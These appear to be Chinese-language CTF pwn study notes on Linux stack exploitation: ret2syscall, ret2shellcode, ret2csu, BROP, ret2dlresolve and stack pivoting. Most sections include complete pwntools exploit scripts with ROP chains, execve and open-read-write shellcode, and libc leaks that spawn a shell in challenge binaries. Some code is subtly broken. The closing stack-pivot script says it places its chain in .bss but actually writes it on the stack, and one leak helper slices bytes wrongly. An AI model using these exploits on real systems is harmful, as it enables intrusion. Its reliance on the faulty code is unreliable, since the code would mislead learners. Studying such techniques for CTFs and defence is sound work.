在题目没有给`libc`的情况下可以通过泄露多个已知函数名的地址，在https://libc.rip/中查询

## 0x03 ret2syscall&ret2shellcode&零碎知识点

### ret2syscall

#### 前置基础

操作系统的进程空间分为用户空间和内核空间，内核空间需要更高的权限，系统调用就是运行在用户空间的程序向操作系统内核请求需要更高权限运行的**内核函数**

当用户态进程发起一个系统调用，`CPU`切换到内核态并开始执行一个内核函数。由于系统调用处理函数只有一个，所以需要通过`rax`传递系统调用号确定调用的函数

#### 利用

应用程序在用户态准备好调用参数（包括系统调用号和函数参数），在`64`位程序中执行`syscall`或在`32`位程序中执行`int 80`触发软中断，`CPU`被软中断打断后执行对应中断处理函数，最后执行`ret`指令切换回用户态

常用系统调用号：

32`位 `read 3 open 5 write 4 sigreturn 77/0x4D execve 11/0xb
64`位 `read 0 open 2 write 1 sigreturn 15/0xF execve 59/0x3b
execve`用法：`execve("/bin/sh", NULL,NULL)

```python
p = p64(pop_rax_ret) + p64(a) + p64(pop_rdi_ret) + p64(b) + p64(pop_rsi_ret) + p64(c) + p64(syscall)
```

对比`ret2libc`

```python
p = p64(pop_rdi_ret) + p64(b) + p64(pop_rsi_ret) + p64(c) + p64(xxx_plt)
```

全部系统调用号参考：https://syscalls.mebeim.net/?table=x86/64/x64/latest

#### 例题ret2syscall

把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们再执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell：

```bash
execve("/bin/sh",NULL,NULL)
```

其中，该程序是 32 位，所以我们需要使得

- 系统调用号，即 eax 应该为 0xb
- 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
- 第二个参数，即 ecx 应该为 0
- 第三个参数，即 edx 应该为 0

```bash
ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
ROPgadget --binary rop  --string '/bin/sh' 
# 0x080bb196 : pop eax ; ret
# 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
# 0x080be408 : /bin/sh
同时获取int 80进行程序软中断
ROPgadget --binary rop  --only 'int'
# 0x08049421 : int 0x80
```

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')

file_name = './rop'

li = lambda x : print('\x1b[01;38;5;214m]' + str(x) + '\x1b[0m')
li = lambda x : print('\x1b[01;38;5;1m]' + str(x) + '\x1b[0m')

context.terminal = ['tmux', 'splitw', '-h']

debug = 0
if debug:
    r = remote('ip', port)
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)

def get_libc():
    return u64(r.recvuntil(b'\x7f'))[-6:].ljust(8, b'\x00')

#0x080bb196 : pop eax ; ret
#0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
#0x080be408 : /bin/sh
#0x08049421 : int 0x80
pop_eax = 0x080bb196
pop_edx_ecx_ebx = 0x0806eb90
bin_sh = 0x080be408
int_80 = 0x08049421

#0xb -> execve()
payload = b'a' * 112 + p32(pop_eax) + p32(0xb) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bin_sh) + p32(int_80)

#dbg()

r.sendline(payload)

r.interactive()
```

### ret2shellcode

#### 前置基础

控制程序执行`shellcode`代码，`shellcode`指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的`shell`，或者`open read write`获取并输出`flag`，通常情况下`shellcode`需要我们自行编写，即向内存中填充一些可执行的代码

前提条件：`shellcode`所在的区域具有可执行权限

#### 工具

查看禁用的函数`seccomp-tools dump ./pwn`

`exp`中`pwntools`使用：

- 使用`asm()`将汇编代码转换为对应的机器码

- 生成`shell`

  ```python
  shellcode = shellcraft.sh()
  ```

- 生成`orw`

  ```python
  shellcode = shellcraft.open('./flag')
  shellcode += shellcraft.read(3, 0x123000 + 0x100, 0x30)	#'rsp'
  shellcode += shellcraft.write(1, 0x123000 + 0x100,0x30)
  ```

- 自己写`shellcode`

  - 执行`execve('/bin/sh', 0, 0)`

    ```assembly
    shellcode = '''
    xor rdx,rdx
    push rdx
    mov rsi,rsp
    mov rax,0x68732f2f6e69622f
    push rax
    mov rdi,rsp
    mov rax,59
    syscall
    '''
    ```

  - 执行`open read write`

    ```assembly
    shellcode = """
    push 0x67616c66
    mov rdi,rsp
    xor esi,esi
    push 2
    pop rax
    syscall
    mov rdi,rax
    mov rsi,rsp
    mov edx,0x100
    xor eax,eax
    syscall
    mov edi,1
    mov rsi,rsp
    push 1
    pop rax
    syscall
    """
    ```

在线汇编和反汇编：http://shell-storm.org/online/Online-Assembler-and-Disassembler/

#### 例题ret2shellcode

```bash
gdb+pwndbg查看bss段是否位rwx（这里新版本的ubuntu发现不可执行，在ubuntu18中就可以获得执行权限，不过问题不大，了解思路即可，毕竟一般的题目不会给bss段执行权限）
```

```python
from pwn import *

#context(arch='amd64', os='linux', log_level='debug')
context(arch='i386', os='linux', log_level='debug')

file_name = './ret2shellcode'

li = lambda x : print('\x1b[01;38;5;214m]' + str(x) + '\x1b[0m')
li = lambda x : print('\x1b[01;38;5;1m]' + str(x) + '\x1b[0m')

context.terminal = ['tmux', 'splitw', '-h']

debug = 0
if debug:
    r = remote('10.1.239.161', 1234)
else:
    r = process(file_name)

def dbg():
    gdb.attach(r)

shellcode = asm(shellcraft.sh())
bss = 0x0804A080
r.sendline(shellcode.ljust(112, b'A') + p32(bss))

#dbg()

r.interactive()
```

#### 例题ret2shellcode1

```bash
1、ida查看buf的长度位0x10，rbp为0x8，ret为0x8，所以首先接收到程序运行时得到的buf起始地址，然后填充覆盖到rbp，后面ret覆盖为shellcode的返回地址，后面写生成的shellcode
2、如果直接在rbp之后编写 shellcode，而不覆盖返回地址，程序会继续使用原来的返回地址，而不是跳转到shellcode，这样shellcode虽然被写入了栈中，但程序不会执行它
```

```python
from pwn import *

context(os="linux", arch="amd64", log_level='info')
io = process('ret2shellcode1')
#io = remote('challenge-6cdb0db93d50f382.sandbox.ctfhub.com', 24126)

io.recvuntil(b'[')
buf_address = int(io.recvuntil(b']')[:-1].decode('utf-8'), 16)
log.success('buf_address => %s' % hex(buf_address).upper())

shellcode_address = buf_address+0x20 # buf与rbp的距离0x10 + rbp的宽度0x8 + 返回地址的长度0x8
log.success('buf_address => %s' % hex(shellcode_address).upper())

shellcode = asm(shellcraft.sh())
payload = b'a'*0x10 + b'fuckpwn!' + p64(shellcode_address) + shellcode
#io.recv()
io.sendline(payload)
io.interactive()
```

#### 常见情况

- 没有开启`NX`保护，可以泄露栈地址向栈中写入`shellcode`再将返回地址改到该地址
- 程序使用`mprotect`函数给某一段可读可写可执行权限，并且让用户向这一段的变量中输入，再直接将输入的变量作为函数调用

### 零碎知识点

整数溢出：变量定义为整型但输入后`(unsigned int)`强制转化为无符号整型，输入`-1`则变成正无穷

字符溢出：`char`类型范围是`-128~+127`，因此输入超过`128`会变成负数

数组越界：`index`可控的时候越界写到其他变量

`str`类函数：例如`strcpy`、`strcat`、`strcmp`、`strlen`等函数会被`\x00`截断

`scanf`：输入`+`或`-`不会有实际输入

随机数绕过：利用`c`和`python`联合编程，例如：

```python
from ctypes import *
libc = cdll.LoadLibrary('./2.35/libc.so.6')

seed = 0
libc.srand(seed)

for i in range(21):
    v6 = (libc.rand() ^ 0x24) + 1
    r.sendlineafter('input: ', str(v6))
```

## 0x04 ret2csu

### x86 与 x64 的区别：

x86 都是保存在栈上面的， 而 x64 中的前六个参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 中，如果还有更多的参数的话才会保存在栈上

详细的例子去看蒸米ROP x64篇

```
x64 下面有一些万能的 gadget：objdump -d ./level5 显示特定的汇编（-D 显示全部的）
观察一下 _libc_csu_init 一般来说，只要是调用了 libc.so 就会有这个函数来对 libc.so 进行初始化
```

![](/images/posts/stack-overflow/2.jpg)

这里面有一些对寄存器操作的，需要注意的是 AT&T 与 8086 汇编语法有些区别

这些前面带百分号的极有可能是 AT&T 汇编，它的 mov 源操作数与目的操作数跟 8086 是反着的

```assembly
  gadgets2
  4005f0:	4c 89 fa             	mov    %r15,%rdx
  4005f3:	4c 89 f6             	mov    %r14,%rsi
  4005f6:	44 89 ef             	mov    %r13d,%edi
  4005f9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
  ....
  gadgets1
  400606:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
  40060b:	48 8b 6c 24 10       	mov    0x10(%rsp),%rbp
  400610:	4c 8b 64 24 18       	mov    0x18(%rsp),%r12
  400615:	4c 8b 6c 24 20       	mov    0x20(%rsp),%r13
  40061a:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
  40061f:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
  400624:	48 83 c4 38          	add    $0x38,%rsp
  400628:	c3                   	retq   
```

通过构造栈上的数据，用 1 然后返回到 2 就可以控制寄存器

![](/images/posts/stack-overflow/3.jpg)

首先通过溢出把一堆数据写在栈上，此时返回地址覆盖为 gadgets1，调用 gaegets1 的时候 rsp+8 通过 gadgets1 把栈上的数据写在寄存器里面，同时把 rsp 再加一下让程序返回到 gadgets2

gadgets2 会把之前寄存器上存的数据放在需要的寄存器上（参数存放顺序：RDI, RSI, RDX, RCX, R8 和 R9）

把 write 函数需要的参数部署好之后通过 call (r12+rbx*8) 之前把 rbx 设置成了 0，当程序执行完 write 函数以后会自己回到这里（因为是 call，正常调用）所以不用管返回地址，继续执行，此时还会执行 gadgets1 上面那张图那样子，gadgets1 里面有一段 add rsp,38h 所以还要填充 38h 个字节把这一段填充掉，使得程序返回的时候是我们写在栈上的 main_addr

write 函数原型是 write(1,address,len) ，1表示标准输出流 ，address 是 write 函数要输出信息的地址 ，而 len 表示输出长度

### 例题

```bash
ret2csu
./level5
```

第一个payload

![](/images/posts/stack-overflow/4.jpg)

第二个payload

![](/images/posts/stack-overflow/5.jpg)

第三个payload

![](/images/posts/stack-overflow/6.jpg)

```
如果不理解为什么rsp+8变成了rsp+16，可以通过gdb+pwndbg进行调试，能够看到rbx为0，rbp直接就是1，将payload第一次写入的p64(0)跳过了
```

![](/images/posts/stack-overflow/7.jpg)

exp：

```bash
# 但是有一个bug，运行时必须要在第59行进行调试才能够运行成功
```

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('level5')
# libc = ELF('./2.35/libc.so.6')
libc = ELF('libc6_2.35-0ubuntu3.6_amd64.so')

p = process('./level5')
# p = remote('127.0.0.1',1234)

got_write = elf.got['write']
print("got_write: " + hex(got_write))
got_read = elf.got['read']
print("got_read: " + hex(got_read))

main = 0x400564

off_system_addr = libc.symbols['write'] - libc.symbols['system']
print("off_system_addr: " + hex(off_system_addr))

# rdi=  edi = r13,  rsi = r14, rdx = r15 
# write(rdi=1, rsi=write.got, rdx=4)
payload1 = b"\x00" * 136
payload1 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8)  # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x4005F0)  # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload1 += b"\x00" * 56
payload1 += p64(main)
p.recvuntil("Hello, World\n")

# gdb.attach(p)
print("\n#############sending payload1#############\n")
p.send(payload1)
sleep(1)
write_addr = u64(p.recv(8))
print("write_addr: " + hex(write_addr))

system_addr = write_addr - off_system_addr
print("system_addr: " + hex(system_addr))

bss_addr = 0x601028

p.recvuntil("Hello, World\n")

# rdi=  edi = r13,  rsi = r14, rdx = r15 
# read(rdi=0, rsi=bss_addr, rdx=16)

payload2 = b"\x00" * 136
payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16)  # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload2 += p64(0x4005F0)  # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload2 += b"\x00" * 56
payload2 += p64(main)

# gdb.attach(p)
print("\n#############sending payload2#############\n")
p.send(payload2)
sleep(1)

gdb.attach(p)
p.send(p64(system_addr))
sleep(1)
p.send("/bin/sh\0")
sleep(1)
p.recvuntil("Hello, World\n")

# rdi=  edi = r13,  rsi = r14, rdx = r15 
# system(rdi = bss_addr+8 = "/bin/sh")
payload3 = b"\x00" * 136
payload3 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr + 8) + p64(0) + p64(0)  # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload3 += p64(0x4005F0)  # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload3 += b"\x00" * 56
payload3 += p64(0)

# gdb.attach(p)
print("\n#############sending payload3#############\n")

sleep(1)
p.send(payload3)

p.interactive()
```

## 0x05 Brop

```bash
# 绑定在端口上
socat tcp-l:9999,reuseaddr,fork exec:./brop
# 也可以用nc
nc -lvvnp 9999 -e ./brop -k
```

## 0x06 ret2dlresolve

### ELF关于动态链接的一些关键section

#### .dynamic

![](/images/posts/stack-overflow/8.jpg)

包含了一些关于动态链接的关键信息，这个section的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心`DT_STRTAB`, `DT_SYMTAB`, `DT_JMPREL`这三项，这三个东西分别包含了指向`.dynstr`, `.dynsym`, `.rel.plt`这3个section的指针，可以`readelf -S main_no_relro_32`看一下，会发现这三个section的地址跟在上图所示的地址是一样的。

#### .dynstr

![](/images/posts/stack-overflow/9.jpg)

一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个puts。到时候，相关数据结构引用一个字符串时，用的是**相对这个section头的偏移**，比方说，在这里，就是字符串相对`0804824C`的偏移。

#### .dynsym

![](/images/posts/stack-overflow/10.jpg)

这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的puts。结构体定义如下

```c
typedef struct
{
  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了
  Elf32_Addr    st_value;
  Elf32_Word    st_size;
  unsigned char st_info; //对于导入函数符号而言，它是0x12
  unsigned char st_other;
  Elf32_Section st_shndx;
}Elf32_Sym; //对于导入函数符号而言，其他字段都是0
```

#### .rel.plt

![](/images/posts/stack-overflow/11.jpg)

这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：

```c
typedef struct
{
  Elf32_Addr    r_offset; //指向GOT表的指针
  Elf32_Word    r_info;
  //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)>>8)，忽略那个07
  //1和3是这个导入函数的符号在.dynsym中的下标，
  //如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应
} Elf32_Rel;
```

### _dl_runtime_resolve做了什么

![](/images/posts/stack-overflow/12.jpg)

0x080497c4是`.dynamic`的指针，与前面图中一致；而第二个参数，是当前要调用的导入函数在`.rel.plt`中的偏移（不过64位的话就直接是index下标），比方说这里，puts就是0，`__libc_start_main`就是`3*sizeof(Elf32_Rel)=24`。

### _dl_runtime_resolve

1. 用`link_map`访问`.dynamic`，取出`.dynstr`, `.dynsym`, `.rel.plt`的指针
2. `.rel.plt + 第二个参数`求出当前函数的重定位表项`Elf32_Rel`的指针，记作`rel`
3. `rel->r_info >> 8`作为`.dynsym`的下标，求出当前函数的符号表项`Elf32_Sym`的指针，记作`sym`
4. `.dynstr + sym->st_name`得出符号名字符串指针
5. 在动态链接库查找这个函数的地址，并且把地址赋值给`*rel->r_offset`，即GOT表
6. 调用这个函数

### 调试理解

在调用函数 strlen 的这个 call 下个断点：b *0x8048594

![](/images/posts/stack-overflow/13.jpg)

run 的时候把程序给断下来，然后 si 跟进这个 call 来看一下，进去之后可以看到首先会去执行下面这一块

![](/images/posts/stack-overflow/14.jpg)

对应之前讲的，跳转到自己的 plt 表项，继续单步执行，看一下

![](/images/posts/stack-overflow/15.jpg)

对应之前讲的跳转到公共的 plt 表项，又一次进行了跳转，对应之前讲的跳转到 dl_runtime_resolve 函数，这个地方就是dl_runtime_resolve 了

![](/images/posts/stack-overflow/16.jpg)

需要注意的是，之前跳转的时候，程序 push 了两个参数，一个是 0x10，一个是 0x80498bc 里面的内容

![](/images/posts/stack-overflow/17.jpg)

这两个参数就是 dl_runtime_resolve 这个函数的两个参数，我们看一下 0x80498bc 里面存着什么

这个地址就是 link_map 的地址

![](/images/posts/stack-overflow/18.jpg)

通过这个地址就可以找到 .dynamic 的地址，第三个就是 0x080497c4

![](/images/posts/stack-overflow/19.jpg)

再根据这一个找到 .dynstr、 .dynsym、 .rel.plt 的地址

- .dynstr 的地址是 .dynamic + 0x44 -> 0x0804824c
- .dynsym 的地址是 .dynamic + 0x4c -> 0x080481ac
- .rel.plt 的地址是 .dynamic + 0x84 -> 0x08048304

![](/images/posts/stack-overflow/20.jpg)

.rel.plt 的地址加上参数 reloc_arg，即 0x08048304 + 0x10 -> 0x08048314

找到的就是函数的重定位表项 Elf32_Rel 的指针，记作 rel

![](/images/posts/stack-overflow/21.jpg)

通过这个 rel 可以得到以下信息

```assembly
r_offset = 0x080498cc  //指向GOT表的指针
r_info = 0x00000407
```

将 r_info>>8 ，即 0x00000407>>8 = 4 作为 .dynsym 中的下标，这里的 ">>" 意思是右移

我们来到 0x080481ac（上面找到的那个 .dynsym 的地址）看一下，在标号为 4 的地方，就是函数名称的偏移：name_offset

![](/images/posts/stack-overflow/22.jpg)

.dynstr + name_offset 就是这个函数的符号名字符串 st_name

0x0804824c + 0x20 -> 0x0804826c

![](/images/posts/stack-overflow/23.jpg)

最后在动态链接库查找这个函数的地址，并且把地址赋值给 *rel -> r_offset，即 GOT 表就可以了

**整理一下：**

```bash
1、dl_runtime_resolve 需要两个参数，一个是 reloc_arg，就是函数自己的 plt 表项 push 的内容，一个是link_map，这个是公共 plt 表项 push 进栈的，通过它可以找到.dynamic的地址
2、而 .dynamic 可以找到 .dynstr、.dynsym、.rel.plt 的这些东西的地址
3、.rel.plt 的地址加上 reloc_arg 可以得到函数重定位表项 Elf32_Rel 的指针，这个指针对应的里面放着 r_offset、r_info
4、将 r_info>>8 得到的就是 .dynsym 的下标，这个下标的内容就是 name_offset
5、.dynstr+name_offset 得到的就是 st_name，而 st_name 存放的就是要调用函数的函数名
6、在动态链接库里面找这个函数的地址，赋值给 *rel->r_offset，也就是 GOT 表就完成了一次函数的动态链接
```

![](/images/posts/stack-overflow/24.jpg)

### 例题no-relro

```python
from pwn import *

# context.log_level="debug"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "i386"
# p = process("./main_no_relro_32")
p = remote("10.1.239.161", 9999)
rop = ROP("./main_no_relro_32")  # 创建一个 ROP 对象
elf = ELF("./main_no_relro_32")

p.recvuntil('Welcome to XDCTF2015~!\n')

offset = 112

rop.raw(offset * 'a')  # 填充 112 字节的垃圾数据（'a'），覆盖栈上的缓冲区，直到返回地址
rop.read(0, 0x08049804 + 4, 4)  # 读取 4 字节数据，写入 0x08049804+4 地址，0x08049804 是 .dynamic 段中 .dynstr 指针的地址，+4 是为了覆盖指针的值
dynstr = elf.get_section_by_name('.dynstr').data()  # 获取原始的 .dynstr 段数据
dynstr = dynstr.replace(b"read", b"system")  # 将 .dynstr 段中的字符串 "read" 替换为 "system"
rop.read(0, 0x080498E0, len(dynstr))  # 将伪造的 .dynstr 段数据写入 0x080498E0 地址（这是一个可写的内存区域），通常为 .bss 段
rop.read(0, 0x080498E0 + 0x100, len("/bin/sh\x00"))  # read /bin/sh\x00
rop.raw(0x08048376)  # the second instruction of read@plt   0x08048376 是 read@plt 的第二条指令地址，用于触发 dl_runtime_resolve
rop.raw(0xdeadbeef)  # 伪造的返回地址
rop.raw(0x080498E0 + 0x100)  # 0x080498E0+0x100 是 /bin/sh 字符串的地址，作为 system 函数的参数
# print(rop.dump())
assert (len(rop.chain()) <= 256)    # 检查 ROP 链的长度是否小于等于 256 字节
rop.raw("a" * (256 - len(rop.chain())))    # 填充剩余的 256 - len(rop.chain()) 字节，用于覆盖返回地址
p.send(rop.chain())
p.send(p32(0x080498E0))    # 发送伪造的 .dynstr 指针值（0x080498E0）
p.send(dynstr)    # 发送伪造的 .dynstr 段数据
p.send("/bin/sh\x00")
p.interactive()
```

### 例题partial-relro

如果`.dynamic`不可写，那么以上方法就没用了，所以有第二种利用方法。要知道前面的`_dl_runtime_resolve`在第二步时

```bash
.rel.plt + 第二个参数 求出当前函数的重定位表项 Elf32_Rel 的指针，记作 rel
```

这个时候，`_dl_runtime_resolve`并没有检查`.rel.plt + 第二个参数`后是否造成越界访问，所以我们能给一个很大的`.rel.plt`的offset（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说`.bss`。

然后第三步

```bash
rel->r_info >> 8 作为 .dynsym 的下标，求出当前函数的符号表项 Elf32_Sym 的指针，记作 sym
```

所以在我们所伪造的`Elf32_Rel`，需要放一个`r_info`字段，大概长这样就行`0xXXXXXX07`，其中`XXXXXX`是相对`.dynsym`表的下标，注意不是偏移，所以是偏移除以`Elf32_Sym`的大小，即除以`0x10`（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个`Elf32_Sym`。至于为什么是07，因为这是一个导入函数，而导入函数一般都是07，所以写成07就好。

 然后第四步

```bash
.dynstr + sym->st_name 得出符号名字符串指针
```

 同样类似，没有进行越界访问检查，所以这个字符串也能够伪造。



## 0x07 栈迁移

栈迁移（Stack Pivot）是一种常见的漏洞利用技术，通常用于将栈指针（`esp`）迁移到攻击者控制的内存区域（如 `.bss` 段），从而绕过栈溢出保护机制（如栈不可执行）。以下是栈迁移到 `.bss` 段并控制 `write` 函数输出字符串的详细步骤：

------

### 栈迁移的基本原理

栈迁移的核心是利用 `leave; ret` 指令：

- **`leave`** 指令相当于：

  ```assembly
  mov esp, ebp
  pop ebp
  ```

  它的作用是将 `esp` 设置为 `ebp` 的值，然后从栈中弹出新的 `ebp` 值。

- **`ret`** 指令相当于：

  ```assembly
  pop eip
  ```

  它的作用是从栈中弹出返回地址并跳转到该地址。

通过控制 `ebp` 和 `esp`，可以将栈迁移到攻击者指定的内存区域（如 `.bss` 段）。

------

### 栈迁移到 `.bss` 段的步骤

#### 准备 `.bss` 段

- `.bss` 段是一个未初始化的全局变量区域，通常具有可写权限。
- 在 `.bss` 段中分配一块内存，用于存放伪造的栈帧。

#### 控制 `ebp` 和 `esp`

- 通过栈溢出漏洞，覆盖返回地址为 `leave; ret` 的地址。
- 同时，覆盖 `ebp` 的值为 `.bss` 段的地址。

#### 执行 `leave; ret`

- 当程序执行 `leave` 时，`esp` 会被设置为 `ebp` 的值（即 `.bss` 段的地址）。
- 接着执行 `ret`，程序会从 `.bss` 段中弹出返回地址并跳转到该地址。

------

### 控制 `write` 函数输出字符串

#### 构造 ROP 链

在 `.bss` 段中构造一个 ROP 链，调用 `write` 函数输出字符串。ROP 链的构造如下：

1. **`write` 函数的地址**：调用 `write` 函数。
2. **返回地址**：可以是任意地址（如 `exit` 函数的地址）。
3. **参数**：
   - `fd`：文件描述符（`1` 表示标准输出）。
   - `buf`：字符串的地址。
   - `count`：字符串的长度。

#### 示例 ROP 链

假设：

- `write` 函数的地址为 `0x08048320`。
- 字符串的地址为 `0x0804a000`（`.bss` 段的某个地址）。
- 字符串的长度为 `10`。

ROP 链的布局如下：

```assembly
0x08048320  # write 函数的地址
0x08048456  # 返回地址（可以是 exit 函数的地址）
0x00000001  # 文件描述符（stdout）
0x0804a000  # 字符串的地址
0x0000000a  # 字符串的长度
```

### 完整利用步骤

#### 栈迁移

1. 通过栈溢出漏洞，覆盖返回地址为 `leave; ret` 的地址。
2. 覆盖 `ebp` 的值为 `.bss` 段的地址（如 `0x0804a000`）。

#### 构造 ROP 链

在 `.bss` 段中构造 ROP 链，调用 `write` 函数输出字符串。

#### 发送 payload

1. 发送栈迁移的 payload。
2. 发送 ROP 链和字符串。

------

### 示例代码

以下是一个完整的利用代码示例：

```python
from pwn import *

# 设置目标程序和架构
context.arch = "i386"
context.log_level = "debug"

# 启动程序
p = process("./vulnerable_binary")

# 获取关键地址
leave_ret = 0x08048456  # leave; ret 的地址
write_plt = 0x08048320  # write 函数的地址
bss_addr = 0x0804a000   # .bss 段的地址

# 构造栈迁移的 payload
payload = b"A" * 112    # 填充垃圾数据
payload += p32(bss_addr)  # 覆盖 ebp 为 .bss 段的地址
payload += p32(leave_ret)  # 覆盖返回地址为 leave; ret

# 构造 ROP 链
rop_chain = p32(write_plt)  # write 函数的地址
rop_chain += p32(0x08048456)  # 返回地址（exit 函数的地址）
rop_chain += p32(1)          # 文件描述符（stdout）
rop_chain += p32(bss_addr + 0x20)  # 字符串的地址
rop_chain += p32(10)         # 字符串的长度

# 构造完整的 payload
payload += rop_chain
payload += b"/bin/sh\x00"   # 字符串内容

# 发送 payload
p.send(payload)

# 进入交互模式
p.interactive()
```

- **栈迁移**：通过 `leave; ret` 将栈迁移到 `.bss` 段。
- **ROP 链**：在 `.bss` 段中构造 ROP 链，调用 `write` 函数输出字符串。
- **利用步骤**：
  1. 覆盖返回地址为 `leave; ret`。
  2. 覆盖 `ebp` 为 `.bss` 段的地址。
  3. 在 `.bss` 段中构造 ROP 链和字符串。
  4. 发送 payload 并触发漏洞。

通过栈迁移技术，可以绕过栈溢出保护机制，实现更灵活的漏洞利用。